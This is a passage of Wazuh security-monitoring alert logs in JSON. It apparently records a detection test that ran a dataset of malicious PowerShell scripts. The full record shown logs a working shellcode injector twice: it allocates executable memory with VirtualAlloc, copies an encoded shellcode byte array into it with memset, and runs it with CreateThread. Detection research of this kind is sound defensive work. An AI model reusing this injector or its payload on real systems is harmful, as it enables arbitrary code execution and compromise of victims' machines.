1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"509f8677-fd70-44ee-a932-5fb08261ce85","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3145.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:50.083+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":163,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304450.3586825","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:10.7157130Z","eventRecordID":"145532","processID":"6740","threadID":"8256","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$Hg41Eh = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Hg41Eh -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xfb,0x70,0xcc,0x4e,0xdb,0xc2,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x03,0x7a,0x13,0x83,0xc2,0xff,0x92,0x39,0xb2,0x17,0xd0,0xc2,0x4b,0xe7,0xb5,0x4b,0xae,0xd6,0xf5,0x28,0xba,0x48,0xc6,0x3b,0xee,0x64,0xad,0x6e,0x1b,0xff,0xc3,0xa6,0x2c,0x48,0x69,0x91,0x03,0x49,0xc2,0xe1,0x02,0xc9,0x19,0x36,0xe5,0xf0,0xd1,0x4b,0xe4,0x35,0x0f,0xa1,0xb4,0xee,0x5b,0x14,0x29,0x9b,0x16,0xa5,0xc2,0xd7,0xb7,0xad,0x37,0xaf,0xb6,0x9c,0xe9,0xa4,0xe0,0x3e,0x0b,0x69,0x99,0x76,0x13,0x6e,0xa4,0xc1,0xa8,0x44,0x52,0xd0,0x78,0x95,0x9b,0x7f,0x45,0x1a,0x6e,0x81,0x81,0x9c,0x91,0xf4,0xfb,0xdf,0x2c,0x0f,0x38,0xa2,0xea,0x9a,0xdb,0x04,0x78,0x3c,0x00,0xb5,0xad,0xdb,0xc3,0xb9,0x1a,0xaf,0x8c,0xdd,0x9d,0x7c,0xa7,0xd9,0x16,0x83,0x68,0x68,0x6c,0xa0,0xac,0x31,0x36,0xc9,0xf5,0x9f,0x99,0xf6,0xe6,0x40,0x45,0x53,0x6c,0x6c,0x92,0xee,0x2f,0xf8,0x57,0xc3,0xcf,0xf8,0xff,0x54,0xa3,0xca,0xa0,0xce,0x2b,0x66,0x28,0xc9,0xac,0x89,0x03,0xad,0x23,0x74,0xac,0xce,0x6a,0xb2,0xf8,0x9e,0x04,0x13,0x81,0x74,0xd5,0x9c,0x54,0xe0,0xd0,0x0a,0x97,0x5d,0xdb,0xc9,0x7f,0x9c,0xdc,0xcc,0xc4,0x29,0x3a,0x9e,0x6a,0x7a,0x93,0x5e,0xdb,0x3a,0x43,0x36,0x31,0xb5,0xbc,0x26,0x3a,0x1f,0xd5,0xcc,0xd5,0xf6,0x8d,0x78,0x4f,0x53,0x45,0x19,0x90,0x49,0x23,0x19,0x1a,0x7e,0xd3,0xd7,0xeb,0x0b,0xc7,0x8f,0x1b,0x46,0xb5,0x19,0x23,0x7c,0xd0,0xa5,0xb1,0x7b,0x73,0xf2,0x2d,0x86,0xa2,0x34,0xf2,0x79,0x81,0x4f,0x3b,0xec,0x6a,0x27,0x44,0xe0,0x6a,0xb7,0x12,0x6a,0x6b,0xdf,0xc2,0xce,0x38,0xfa,0x0c,0xdb,0x2c,0x57,0x99,0xe4,0x04,0x04,0x0a,0x8d,0xaa,0x73,0x7c,0x12,0x54,0x56,0x7c,0x6e,0x83,0x9e,0x0a,0x9e,0x17;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$RqT=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($RqT.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$RqT,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 249253f9-f2d9-410f-817d-8d78c30109e0\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3163.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$Hg41Eh = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Hg41Eh -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xfb,0x70,0xcc,0x4e,0xdb,0xc2,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x03,0x7a,0x13,0x83,0xc2,0xff,0x92,0x39,0xb2,0x17,0xd0,0xc2,0x4b,0xe7,0xb5,0x4b,0xae,0xd6,0xf5,0x28,0xba,0x48,0xc6,0x3b,0xee,0x64,0xad,0x6e,0x1b,0xff,0xc3,0xa6,0x2c,0x48,0x69,0x91,0x03,0x49,0xc2,0xe1,0x02,0xc9,0x19,0x36,0xe5,0xf0,0xd1,0x4b,0xe4,0x35,0x0f,0xa1,0xb4,0xee,0x5b,0x14,0x29,0x9b,0x16,0xa5,0xc2,0xd7,0xb7,0xad,0x37,0xaf,0xb6,0x9c,0xe9,0xa4,0xe0,0x3e,0x0b,0x69,0x99,0x76,0x13,0x6e,0xa4,0xc1,0xa8,0x44,0x52,0xd0,0x78,0x95,0x9b,0x7f,0x45,0x1a,0x6e,0x81,0x81,0x9c,0x91,0xf4,0xfb,0xdf,0x2c,0x0f,0x38,0xa2,0xea,0x9a,0xdb,0x04,0x78,0x3c,0x00,0xb5,0xad,0xdb,0xc3,0xb9,0x1a,0xaf,0x8c,0xdd,0x9d,0x7c,0xa7,0xd9,0x16,0x83,0x68,0x68,0x6c,0xa0,0xac,0x31,0x36,0xc9,0xf5,0x9f,0x99,0xf6,0xe6,0x40,0x45,0x53,0x6c,0x6c,0x92,0xee,0x2f,0xf8,0x57,0xc3,0xcf,0xf8,0xff,0x54,0xa3,0xca,0xa0,0xce,0x2b,0x66,0x28,0xc9,0xac,0x89,0x03,0xad,0x23,0x74,0xac,0xce,0x6a,0xb2,0xf8,0x9e,0x04,0x13,0x81,0x74,0xd5,0x9c,0x54,0xe0,0xd0,0x0a,0x97,0x5d,0xdb,0xc9,0x7f,0x9c,0xdc,0xcc,0xc4,0x29,0x3a,0x9e,0x6a,0x7a,0x93,0x5e,0xdb,0x3a,0x43,0x36,0x31,0xb5,0xbc,0x26,0x3a,0x1f,0xd5,0xcc,0xd5,0xf6,0x8d,0x78,0x4f,0x53,0x45,0x19,0x90,0x49,0x23,0x19,0x1a,0x7e,0xd3,0xd7,0xeb,0x0b,0xc7,0x8f,0x1b,0x46,0xb5,0x19,0x23,0x7c,0xd0,0xa5,0xb1,0x7b,0x73,0xf2,0x2d,0x86,0xa2,0x34,0xf2,0x79,0x81,0x4f,0x3b,0xec,0x6a,0x27,0x44,0xe0,0x6a,0xb7,0x12,0x6a,0x6b,0xdf,0xc2,0xce,0x38,0xfa,0x0c,0xdb,0x2c,0x57,0x99,0xe4,0x04,0x04,0x0a,0x8d,0xaa,0x73,0x7c,0x12,0x54,0x56,0x7c,0x6e,0x83,0x9e,0x0a,0x9e,0x17;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$RqT=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($RqT.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$RqT,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"249253f9-f2d9-410f-817d-8d78c30109e0","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3163.ps1"}}},"location":"EventChannel"}
